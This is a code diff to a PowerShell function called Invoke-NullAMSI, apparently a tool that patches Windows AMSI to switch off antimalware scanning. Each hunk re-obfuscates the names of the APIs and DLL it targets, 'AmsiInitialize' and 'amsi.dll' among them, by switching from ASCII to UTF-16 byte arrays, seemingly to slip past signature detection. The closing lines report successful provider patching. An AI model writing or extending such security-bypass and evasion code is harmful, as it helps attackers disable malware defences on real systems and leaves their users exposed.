@@ -66,13 +66,13 @@ function Invoke-NullAMSI {
     # Obtain native methods
     $unsafeMethodsType = [Windows.Forms.Form].Assembly.GetType('System.Windows.Forms.UnsafeNativeMethods')
 
-    # Strings "obfuscated" in ASCII bytes
-    $bytesGetProc = [Byte[]](0x47, 0x65, 0x74, 0x50, 0x72, 0x6F, 0x63, 0x41, 0x64, 0x64, 0x72, 0x65, 0x73, 0x73)
-    $bytesGetMod =  [Byte[]](0x47, 0x65, 0x74, 0x4D, 0x6F, 0x64, 0x75, 0x6C, 0x65, 0x48, 0x61, 0x6E, 0x64, 0x6C, 0x65)
+    # Strings "obfuscated" in Unicode bytes
+    $bytesGetProc = [Byte[]](71, 0, 101, 0, 116, 0, 80, 0, 114, 0, 111, 0, 99, 0, 65, 0, 100, 0, 100, 0, 114, 0, 101, 0, 115, 0, 115, 0)
+    $bytesGetMod =  [Byte[]](71, 0, 101, 0, 116, 0, 77, 0, 111, 0, 100, 0, 117, 0, 108, 0, 101, 0, 72, 0, 97, 0, 110, 0, 100, 0, 108, 0, 101, 0)
 
-    # Get strings from ASCII bytes
-    $GetProc = [System.Text.Encoding]::ASCII.GetString($bytesGetProc)
-    $GetMod = [System.Text.Encoding]::ASCII.GetString($bytesGetMod)
+    # Get strings from Unicode bytes
+    $GetProc = [Text.Encoding]::Unicode.GetString($bytesGetProc)
+    $GetMod = [Text.Encoding]::Unicode.GetString($bytesGetMod)
 
     # Get GetModule address using native methods
     $GetModule = $unsafeMethodsType.GetMethod($GetMod)
@@ -89,10 +89,10 @@ function Invoke-NullAMSI {
     Write-Verbose "[*] Handle of ${GetProc}: $($GetAddres.MethodHandle.Value)"
 
     # "Same" technique as above
-    $bytes4msiInit = [Byte[]](0x41, 0x6D, 0x73, 0x69, 0x49, 0x6E, 0x69, 0x74, 0x69, 0x61, 0x6C, 0x69, 0x7A, 0x65)
-    $bytes4msi = [Byte[]](0x61, 0x6d, 0x73, 0x69, 0x2e, 0x64, 0x6c, 0x6c)
-    $4msi = [System.Text.Encoding]::ASCII.GetString($bytes4msi)
-    $4msiInit = [System.Text.Encoding]::ASCII.GetString($bytes4msiInit)
+    $bytes4msiInit = [Byte[]](65, 0, 109, 0, 115, 0, 105, 0, 73, 0, 110, 0, 105, 0, 116, 0, 105, 0, 97, 0, 108, 0, 105, 0, 122, 0, 101, 0)
+    $bytes4msi = [Byte[]](97, 0, 109, 0, 115, 0, 105, 0, 46, 0, 100, 0, 108, 0, 108, 0)
+    $4msi = [System.Text.Encoding]::Unicode.GetString($bytes4msi)
+    $4msiInit = [System.Text.Encoding]::Unicode.GetString($bytes4msiInit)
 
     # Obtain the respective address from 4msi
     $4msiAddr = Get-Function $4msi $4msiInit
@@ -261,4 +261,3 @@ function Invoke-NullAMSI {
 
     Write-Host "[*] Successful providers patching, 4MSI patched" -ForegroundColor Green
 }
-
